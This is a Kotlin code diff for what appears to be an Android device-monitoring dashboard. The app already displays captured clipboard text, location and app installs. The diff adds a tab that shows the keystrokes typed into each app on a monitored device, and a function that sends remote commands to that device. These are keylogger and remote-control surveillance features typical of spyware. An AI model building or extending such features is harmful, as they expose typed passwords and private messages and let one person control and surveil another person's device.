@@ -32,6 +32,7 @@ enum class DashboardTab(val label: String, val kind: String?) {
     SECURITY("Security", "SECURITY_EVENT"),
     LOCATION("Location", "LOCATION"),
     INSTALLS("Installs", "APP_INSTALL"),
+    KEYSTROKES("Keys", "KEYSTROKE"),
 }
 
 data class AppUsageEntry(
@@ -93,6 +94,12 @@ class DashboardViewModel @Inject constructor(
                 selectedTab = tab,
                 parsedEvents = filterAndParse(current.allEvents, tab),
             )
+        }
+    }
+
+    fun sendCommand(type: String) {
+        viewModelScope.launch {
+            apiClient.sendCommand(repository.deviceId, type)
         }
     }
 
@@ -228,6 +235,12 @@ class DashboardViewModel @Inject constructor(
             "CLIPBOARD" -> {
                 val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
                 ParsedEvent(event, "Clipboard copied", text.take(100), "clipboard")
+            }
+            "KEYSTROKE" -> {
+                val app = obj?.get("appName")?.jsonPrimitive?.content
+                    ?: obj?.get("packageName")?.jsonPrimitive?.content ?: ""
+                val text = obj?.get("text")?.jsonPrimitive?.content ?: ""
+                ParsedEvent(event, "Typed in $app", text, "keystroke")
             }
             else -> ParsedEvent(event, event.kind, event.payload.take(80), "unknown")
         }
